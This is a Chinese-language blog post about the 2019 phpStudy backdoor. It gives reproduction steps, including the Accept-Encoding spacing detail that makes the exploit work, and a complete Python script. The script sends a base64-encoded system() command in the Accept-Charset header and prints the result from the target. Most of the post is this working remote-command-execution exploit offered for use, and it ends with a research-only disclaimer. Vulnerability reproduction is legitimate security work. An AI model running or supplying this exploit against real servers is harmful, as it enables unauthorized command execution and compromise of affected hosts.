---
title: "phpstudy后门exp"
date: "2019-09-25T16:41:00+08:00"
lastmod: "2021-05-17T17:28:27+08:00"
description: "前阵子phpstudy爆了后门，网络安全周爆的呢 影响版本phpstudy 2016版PHP5.4 据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测 据传言这个也存在 现在网上着分析消息一般就三种，一种是新闻报道，一种是逆向研究，还有就是exp 看了很多个exp代码又复杂又不好用，最后决定自己写一个试试 看了看其实就是报文里有两个属性字段被修改了，其他正常"
url: "/2019/09/25/phpstudy后门exp/"
slug: "phpstudy-hou-men-exp"
author: sshuo
source: html-legacy
commentsPath: "/2019/09/25/phpstudy后门exp/"
categories: ["网络安全"]
tags: ["漏洞复现", "渗透测试"]
---

前阵子phpstudy爆了后门，网络安全周爆的呢

影响版本phpstudy 2016版PHP5.4

据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测

据传言这个也存在

![](/images/2019/09/4256490006.png)

现在网上着分析消息一般就三种，一种是新闻报道，一种是逆向研究，还有就是exp

看了很多个exp代码又复杂又不好用，最后决定自己写一个试试

看了看其实就是报文里有两个属性字段被修改了，其他正常发包即可

首先用burp试了试，复现失败，没有返回命令内容

后来无意中发现把Accept-Encoding后面属性deflate最前面的空格去掉即可

命令：echo “111111111111111”;

![](/images/2019/09/3271259473.png)

（1处deflate前面去掉一个空格，2处为命令内容b64编码）

复现成功

python写一个

```
# -*- coding: utf-8 -*-
import requests,base64,sys
def go(url):
	if 'http' not in url:
		url = 'http://'+url
	else:
		a = input('请输入指令\n')
		b = 'system("%s");' %a
		c = base64.b64encode(b.encode('utf-8'))
		payload = (str(c,'utf-8'))
		headers = {
	                'Accept-Encoding':'gzip,deflate',
	                'Accept-Charset':payload
	            }
		send = requests.get(url=url,headers=headers,timeout=10)
		if send.status_code == 200:
			print('发送成功')
			print(send.text)
		else:
			print('执行失败，可能后门不存在')

if __name__ == '__main__':
	t=input('请输入url\n')
	go(t)
```

直接运行系统命令

但是这个后门本质是运行php代码

因为我写的第八行所以只跑了系统命令

输出部分本来想美化，后来发现会影响回显遂放弃  
[github](https://github.com/shiyeshu/phpstudy_exp)

本文章已经所附代码仅供技术研究，请勿用于其他用途
